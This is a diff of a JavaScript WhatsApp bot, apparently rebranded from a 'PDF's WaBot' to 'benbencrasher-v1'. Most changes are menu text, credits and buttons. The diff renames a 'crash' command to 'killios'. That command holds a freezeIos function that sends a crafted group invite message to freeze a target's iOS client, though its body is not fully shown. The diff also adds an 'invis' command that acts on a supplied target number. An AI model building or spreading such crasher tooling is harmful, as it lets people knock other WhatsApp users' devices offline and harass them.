@@ -1,3 +1,5 @@
+import { handleInvisCase } from "./invis.js";
+
 const fs = require('fs');
 const axios = require('axios');
 const didyoumean = require('didyoumean');
@@ -40,7 +42,7 @@ try {
 
   const senderNumber = sender.split('@')[0];
   const budy = (typeof m.text === 'string' ? m.text : '');
-  const prefa = ["", "!", ".", ",", "🐤", "🗿"];
+  const prefa = ["."];
   const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? prefa;
   const from = m.key.remoteJid;
   const isGroup = from.endsWith("@g.us");
@@ -110,9 +112,10 @@ try {
     })
   }
 
+
   switch (command) {
     case "menu": {
-      const teks = `PDF's Was Created By @YuukeyD7eppeli`;
+      const teks = `benbencrasher-v1 | PDF's WaBot`;
       const msg = {
         interactiveMessage: {
           title: teks, 
@@ -120,24 +123,24 @@ try {
           nativeFlowMessage: {
             messageParamsJson: JSON.stringify({
               limited_time_offer: {
-                text: "PDF's WaBot",
-                url: "t.me/YuukeyD7eppeli",
-                copy_code: "7eppeli.pdf",
+                text: "benbencrasherv1",
+                url: "t.me/itsthemoneyman",
+                copy_code: "benben",
                 expiration_time: Date.now() * 999
               },
               bottom_sheet: {
                 in_thread_buttons_limit: 2,
                 divider_indices: [1, 2, 3, 4, 5, 999],
-                list_title: "PDF's WaBot",
-                button_title: "PDF's Family"
+                list_title: "benbencrasher-v1",
+                button_title: "MENU"
               }
             }),
             buttons: [
               {
                 name: "cta_url",
                 buttonParamsJson: JSON.stringify({
-                  display_text: "Telegram Creator",
-                  url: "https://t.me/YuukeyD7eppeli"
+                  display_text: "My Repos",
+                  url: "https://github.com/hacksbyben"
                 })
               }, 
               {
@@ -150,10 +153,38 @@ try {
               {
                 name: "quick_reply",
                 buttonParamsJson: JSON.stringify({
-                  display_text: "Thanks To", 
-                  id: "tqto"
+                  display_text: "Thanks To:", 
+                  id: "credits"
                 })
               }, 
+              {
+                name: "quick_reply",
+                buttonParamsJson: JSON.stringify({
+                  display_text: "Get Message Data", 
+                  id: "get"
+                })
+              },
+              {
+                name: "quick_reply",
+                buttonParamsJson: JSON.stringify({
+                  display_text: "My Device ID", 
+                  id: "meid"
+                })
+              },
+              {
+                name: "quick_reply",
+                buttonParamsJson: JSON.stringify({
+                  display_text: "This Chat ID", 
+                  id: "tsid"
+                })
+              },
+              {
+                name: "quick_reply",
+                buttonParamsJson: JSON.stringify({
+                  display_text: "invisible tagall", 
+                  id: "hidetag"
+                })
+              },
               {
                 name: "address_message",
                 buttonParamsJson: "{}"
@@ -197,14 +228,14 @@ try {
             }
           ], 
           newsletter: {
-            newsletterJid: "120363425000320171@newsletter", 
-            newsletterName: "PDF's Team | Information"
+            newsletterJid: "_____________@newsletter", 
+            newsletterName: "benbencrasher | Information"
           }
         } 
       }, { quoted: x });
     }
     break;
-    case "tqto": {
+    case "credits": {
       const teks = `There's My Family who help me in 2025 - 2026`;
       const msg = {
         interactiveMessage: {
@@ -213,23 +244,23 @@ try {
           nativeFlowMessage: {
             messageParamsJson: JSON.stringify({
               limited_time_offer: {
-                text: "PDF's WaBot",
-                url: "t.me/YuukeyD7eppeli",
-                copy_code: "7eppeli.pdf",
+                text: "benbencrasher-v1",
+                url: "google.com",
+                copy_code: "benben",
                 expiration_time: Date.now() * 999
               },
               bottom_sheet: {
                 in_thread_buttons_limit: 1,
                 divider_indices: [1, 2, 3, 4, 5, 999],
-                list_title: "PDF's WaBot",
-                button_title: "PDF's Family"
+                list_title: "benbencrasher-v1",
+                button_title: "benben's Family"
               }
             }),
             buttons: [
               {
                 name: "galaxy_message", 
                 buttonParamsJson: JSON.stringify({
-                  flow_cta: "╭───「 PDF's Family 」", 
+                  flow_cta: "╭───「 ben's Family 」", 
                   flow_message_version: "3", 
                   flow_id: ".menu"
                 })
@@ -237,7 +268,7 @@ try {
               {
                 name: "galaxy_message",
                 buttonParamsJson: JSON.stringify({
-                  flow_cta: "│ ▢ 7eppeli.pdf", 
+                  flow_cta: "│ ▢ Archietech", 
                   flow_message_version: "3", 
                   flow_id: ".menu"
                 })
@@ -245,7 +276,7 @@ try {
               {
                 name: "galaxy_message",
                 buttonParamsJson: JSON.stringify({
-                  flow_cta: "│ ▢ Jhonixhox.pdf", 
+                  flow_cta: "│ ▢ Object", 
                   flow_message_version: "3", 
                   flow_id: ".menu"
                 })
@@ -253,7 +284,7 @@ try {
               {
                 name: "galaxy_message",
                 buttonParamsJson: JSON.stringify({
-                  flow_cta: "│ ▢ X$-thanror(.pdf?)", 
+                  flow_cta: "│ ▢ Shen", 
                   flow_message_version: "3", 
                   flow_id: ".menu"
                 })
@@ -261,11 +292,19 @@ try {
               {
                 name: "galaxy_message",
                 buttonParamsJson: JSON.stringify({
-                  flow_cta: "│ ▢ X4$-shaka.pdf ( Kelra )", 
+                  flow_cta: "│ ▢ Leo", 
                   flow_message_version: "3", 
                   flow_id: ".menu"
                 })
               }, 
+              {
+                name: "galaxy_message",
+                buttonParamsJson: JSON.stringify({
+                  flow_cta: "│ ▢ Alphasolid", 
+                  flow_message_version: "3", 
+                  flow_id: ".menu"
+                })
+              },
               {
                 name: "galaxy_message", 
                 buttonParamsJson: JSON.stringify({
@@ -284,7 +323,7 @@ try {
       })
     }
     break;
-    case "info": {
+    case "get": {
       const infogetclone1 = m.quoted ? {
         [m.quoted.mtype]:m.quoted
       } : {
@@ -294,7 +333,7 @@ try {
       reply(`${formattedJson}`)
     }
     break;
-    case "crash": {
+    case "killios": {
       async function freezeIos(target, group = false) {
         const message = generateWAMessageFromContent(target, {
           groupInviteMessage: {
@@ -335,9 +374,14 @@ try {
       reply(`${m.chat}`)
     }
     break;
-    case "invtag": {
-      if (!isAdmins) return reply("Hanya admin yang dapat menggunakan perintah ini")
-      if (!isBotAdmins) return reply("Hanya admin yang dapat menggunakan perintah ini")
+    case "invis":
+      {
+        const targetNumber = message.body.split(" ")[1]; // Extract target number from the command
+        await handleInvisCase(botInstance, message, targetNumber);
+      }
+      break;
+    case "hidetag": {
+      if (!isOwner) return reply("Bro is not an owner 💀")
       let member = groupMetadata.participants.map(e => e.id)
       await WaSocket.relayMessage(m.chat, {
         albumMessage: {
